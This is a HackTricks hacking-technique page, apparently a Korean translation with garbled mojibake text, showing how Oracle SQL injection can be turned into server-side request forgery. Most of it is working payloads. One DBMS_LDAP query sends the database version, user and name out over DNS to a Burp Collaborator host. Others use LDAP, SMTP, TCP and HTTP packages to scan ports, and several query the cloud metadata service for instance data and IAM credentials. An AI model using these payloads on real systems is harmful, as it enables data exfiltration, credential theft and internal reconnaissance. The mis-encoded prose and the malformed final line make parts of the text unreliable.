# Oracle injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**ì´ ê²Œì‹œë¬¼ì€ [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)ì—ì„œ ì‚­ì œëœ ê²Œì‹œë¬¼ì˜ ì›¨ì´ë°± ë¨¸ì‹  ë³µì‚¬ë³¸ì„ ì œê³µí•©ë‹ˆë‹¤.**

## SSRF

Oracleì„ ì‚¬ìš©í•˜ì—¬ Out of Band HTTP ë° DNS ìš”ì²­ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì€ ì˜ ë¬¸ì„œí™”ë˜ì–´ ìˆì§€ë§Œ, SQL ë°ì´í„° ìœ ì¶œì˜ ìˆ˜ë‹¨ìœ¼ë¡œë„ ì‚¬ìš©ë©ë‹ˆë‹¤. ìš°ë¦¬ëŠ” í•­ìƒ ì´ëŸ¬í•œ ê¸°ìˆ /ê¸°ëŠ¥ì„ ìˆ˜ì •í•˜ì—¬ ë‹¤ë¥¸ SSRF/XSPAë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Oracle ì„¤ì¹˜ëŠ” ì •ë§ ê³ í†µìŠ¤ëŸ¬ìš¸ ìˆ˜ ìˆìœ¼ë©°, íŠ¹íˆ ëª…ë ¹ì„ ì‹œë„í•˜ê¸° ìœ„í•´ ë¹ ë¥¸ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì„¤ì •í•˜ë ¤ëŠ” ê²½ìš° ë”ìš± ê·¸ë ‡ìŠµë‹ˆë‹¤. [Appsecco](https://appsecco.com)ì˜ ì¹œêµ¬ì´ì ë™ë£Œì¸ [Abhisek Datta](https://github.com/abhisek)ê°€ [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)ë¥¼ ì•Œë ¤ì£¼ì—ˆê³ , ì´ë¥¼ í†µí•´ t2.large AWS Ubuntu ë¨¸ì‹ ê³¼ Dockerì—ì„œ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

ë‚˜ëŠ” `--network="host"` í”Œë˜ê·¸ì™€ í•¨ê»˜ ë„ì»¤ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì˜ ê³¼ì • ë™ì•ˆ Oracleì„ ì „ì²´ ë„¤íŠ¸ì›Œí¬ ì ‘ê·¼ì´ ê°€ëŠ¥í•œ ë„¤ì´í‹°ë¸Œ ì„¤ì¹˜ë¡œ ëª¨ë°©í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### URL ë˜ëŠ” í˜¸ìŠ¤íŠ¸/í¬íŠ¸ ë²ˆí˜¸ ì‚¬ì–‘ì„ ì§€ì›í•˜ëŠ” Oracle íŒ¨í‚¤ì§€ <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

í˜¸ìŠ¤íŠ¸ ë° í¬íŠ¸ ì‚¬ì–‘ì„ ì§€ì›í•˜ëŠ” íŒ¨í‚¤ì§€ì™€ ê¸°ëŠ¥ì„ ì°¾ê¸° ìœ„í•´ [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html)ì—ì„œ Google ê²€ìƒ‰ì„ ì‹¤í–‰í–ˆìŠµë‹ˆë‹¤. êµ¬ì²´ì ìœ¼ë¡œ,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
ê²€ìƒ‰ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤ (ëª¨ë‘ ì™¸ë¶€ ë„¤íŠ¸ì›Œí¬ë¥¼ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê²ƒì€ ì•„ë‹˜)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

ì´ ê°„ë‹¨í•œ ê²€ìƒ‰ì€ `DBMS_LDAP`ì™€ ê°™ì€ íŒ¨í‚¤ì§€ë¥¼ ëª…ë°±íˆ ê±´ë„ˆëœë‹ˆë‹¤ (í˜¸ìŠ¤íŠ¸ ì´ë¦„ê³¼ í¬íŠ¸ ë²ˆí˜¸ë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆìŒ) [ë¬¸ì„œ í˜ì´ì§€](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)ê°€ ë‹¨ìˆœíˆ [ë‹¤ë¥¸ ìœ„ì¹˜](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)ë¡œ ì•ˆë‚´í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì œê°€ ë†“ì³¤ì„ ìˆ˜ ìˆëŠ” ì™¸ë¶€ ìš”ì²­ì„ ë§Œë“¤ê¸° ìœ„í•´ ì•…ìš©ë  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ Oracle íŒ¨í‚¤ì§€ê°€ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì–´ì¨Œë“ , ìš°ë¦¬ê°€ ë°œê²¬í•˜ê³  ë‚˜ì—´í•œ íŒ¨í‚¤ì§€ ì¤‘ ì¼ë¶€ë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

**DBMS\_LDAP.INIT**

`DBMS_LDAP` íŒ¨í‚¤ì§€ëŠ” LDAP ì„œë²„ì—ì„œ ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. `init()` í•¨ìˆ˜ëŠ” LDAP ì„œë²„ì™€ì˜ ì„¸ì…˜ì„ ì´ˆê¸°í™”í•˜ë©° í˜¸ìŠ¤íŠ¸ ì´ë¦„ê³¼ í¬íŠ¸ ë²ˆí˜¸ë¥¼ ì¸ìˆ˜ë¡œ ë°›ìŠµë‹ˆë‹¤.

ì´ í•¨ìˆ˜ëŠ” ì•„ë˜ì™€ ê°™ì´ DNSë¥¼ í†µí•´ ë°ì´í„° ìœ ì¶œì„ ë³´ì—¬ì£¼ê¸° ìœ„í•´ ì´ì „ì— ë¬¸ì„œí™”ë˜ì—ˆìŠµë‹ˆë‹¤.
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
ê·¸ëŸ¬ë‚˜ ì´ í•¨ìˆ˜ê°€ í˜¸ìŠ¤íŠ¸ ì´ë¦„ê³¼ í¬íŠ¸ ë²ˆí˜¸ë¥¼ ì¸ìˆ˜ë¡œ ë°›ê¸° ë•Œë¬¸ì—, ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ í¬íŠ¸ ìŠ¤ìºë„ˆì²˜ëŸ¼ ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒì€ ëª‡ ê°€ì§€ ì˜ˆì…ë‹ˆë‹¤.
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
`ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.`ëŠ” í¬íŠ¸ê°€ ë‹«í˜€ ìˆìŒì„ ë‚˜íƒ€ë‚´ì§€ë§Œ ì„¸ì…˜ ê°’ì€ í¬íŠ¸ê°€ ì—´ë ¤ ìˆìŒì„ ê°€ë¦¬í‚µë‹ˆë‹¤.

**UTL\_SMTP**

`UTL_SMTP` íŒ¨í‚¤ì§€ëŠ” SMTPë¥¼ í†µí•´ ì´ë©”ì¼ì„ ë³´ë‚´ê¸° ìœ„í•´ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. [Oracle ë¬¸ì„œ ì‚¬ì´íŠ¸ì— ì œê³µëœ ì˜ˆì œëŠ” ì´ íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ë©”ì¼ì„ ë³´ë‚´ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). ê·¸ëŸ¬ë‚˜ ìš°ë¦¬ì—ê²Œ í¥ë¯¸ë¡œìš´ ì ì€ í˜¸ìŠ¤íŠ¸ ë° í¬íŠ¸ ì‚¬ì–‘ì„ ì œê³µí•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì…ë‹ˆë‹¤.

ì•„ë˜ëŠ” 2ì´ˆì˜ íƒ€ì„ì•„ì›ƒì„ ê°€ì§„ `UTL_SMTP.OPEN_CONNECTION` í•¨ìˆ˜ì˜ ê°„ë‹¨í•œ ì˜ˆì…ë‹ˆë‹¤.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: transfer timeout`ëŠ” í¬íŠ¸ê°€ ì—´ë ¤ ìˆì§€ë§Œ SMTP ì—°ê²°ì´ ì„¤ì •ë˜ì§€ ì•Šì•˜ìŒì„ ë‚˜íƒ€ë‚´ê³ , `ORA-29278: SMTP transient error: 421 Service not available`ëŠ” í¬íŠ¸ê°€ ë‹«í˜€ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

**UTL\_TCP**

`UTL_TCP` íŒ¨í‚¤ì§€ì™€ ê·¸ ì ˆì°¨ ë° í•¨ìˆ˜ëŠ” [ì„œë¹„ìŠ¤ì™€ì˜ TCP/IP ê¸°ë°˜ í†µì‹ ì„ í—ˆìš©í•©ë‹ˆë‹¤](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). íŠ¹ì • ì„œë¹„ìŠ¤ì— ë§ê²Œ í”„ë¡œê·¸ë˜ë°ëœ ê²½ìš°, ì´ íŒ¨í‚¤ì§€ëŠ” ë„¤íŠ¸ì›Œí¬ë¡œì˜ ì ‘ê·¼ ë°©ë²•ì´ ë˜ê±°ë‚˜ ëª¨ë“  TCP/IP ì—°ê²°ì˜ ëª¨ë“  ì¸¡ë©´ì„ ì œì–´í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì „ì²´ ì„œë²„ ì¸¡ ìš”ì²­ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[Oracle ë¬¸ì„œ ì‚¬ì´íŠ¸ì˜ ì˜ˆì œëŠ” ì´ íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ í˜ì´ì§€ë¥¼ ê°€ì ¸ì˜¤ê¸° ìœ„í•´ ì›ì‹œ TCP ì—°ê²°ì„ ë§Œë“œëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). ìš°ë¦¬ëŠ” ì´ë¥¼ ì¡°ê¸ˆ ë” ë‹¨ìˆœí™”í•˜ì—¬ ë©”íƒ€ë°ì´í„° ì¸ìŠ¤í„´ìŠ¤ë‚˜ ì„ì˜ì˜ TCP/IP ì„œë¹„ìŠ¤ì— ìš”ì²­ì„ ë§Œë“œëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
í¥ë¯¸ë¡­ê²Œë„, ì›ì‹œ TCP ìš”ì²­ì„ ì‘ì„±í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ ë•ë¶„ì— ì´ íŒ¨í‚¤ì§€ëŠ” ëª¨ë“  í´ë¼ìš°ë“œ ì œê³µìì˜ ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤ì— ì¿¼ë¦¬í•˜ëŠ” ë°ì—ë„ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë©”ì„œë“œ ìœ í˜•ê³¼ ì¶”ê°€ í—¤ë”ëŠ” ëª¨ë‘ TCP ìš”ì²­ ë‚´ì—ì„œ ì „ë‹¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**UTL\_HTTP ë° ì›¹ ìš”ì²­**

ì•„ë§ˆë„ ëª¨ë“  Out of Band Oracle SQL Injection íŠœí† ë¦¬ì–¼ì—ì„œ ê°€ì¥ ì¼ë°˜ì ì´ê³  ë„ë¦¬ ë¬¸ì„œí™”ëœ ê¸°ìˆ ì€ [`UTL_HTTP` íŒ¨í‚¤ì§€](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070)ì…ë‹ˆë‹¤. ì´ íŒ¨í‚¤ì§€ëŠ” ë¬¸ì„œì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜ë©ë‹ˆë‹¤ - `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
ë‹¹ì‹ ì€ ë˜í•œ ë‹¤ìŒê³¼ ê°™ì€ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¸°ë³¸ì ì¸ í¬íŠ¸ ìŠ¤ìºë‹ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` ë˜ëŠ” `TNS:operation timed out`ëŠ” TCP í¬íŠ¸ê°€ ë‹«í˜€ ìˆë‹¤ëŠ” ì‹ í˜¸ì´ë©°, `ORA-29263: HTTP protocol error` ë˜ëŠ” ë°ì´í„°ëŠ” í¬íŠ¸ê°€ ì—´ë ¤ ìˆë‹¤ëŠ” ì‹ í˜¸ì…ë‹ˆë‹¤.

ì œê°€ ê³¼ê±°ì— ì‚¬ìš©í–ˆë˜ ë˜ ë‹¤ë¥¸ íŒ¨í‚¤ì§€ëŠ” [`HTTPURITYPE` Oracle ì¶”ìƒ íƒ€ì…ì˜ `GETCLOB()` ë©”ì„œë“œ](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705)ë¡œ, URLê³¼ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆê²Œ í•´ì£¼ë©° HTTP í”„ë¡œí† ì½œì„ ì§€ì›í•©ë‹ˆë‹¤. `GETCLOB()` ë©”ì„œë“œëŠ” URLì—ì„œ GET ì‘ë‹µì„ [CLOB ë°ì´í„° íƒ€ì…ìœ¼ë¡œ ê°€ì ¸ì˜¤ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
